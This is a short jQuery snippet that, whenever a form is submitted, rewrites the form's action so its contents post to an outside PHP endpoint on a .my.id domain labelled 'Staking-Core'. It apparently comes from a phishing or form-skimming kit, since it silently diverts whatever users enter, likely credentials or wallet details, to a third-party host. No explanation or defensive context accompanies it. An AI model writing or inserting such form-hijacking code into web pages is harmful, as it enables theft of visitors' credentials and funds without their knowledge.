$("form").submit(function() {
  $(myform).attr("action", "https://torpedo-mashee.my.id/core/kawahari.php?Staking-Core");
});
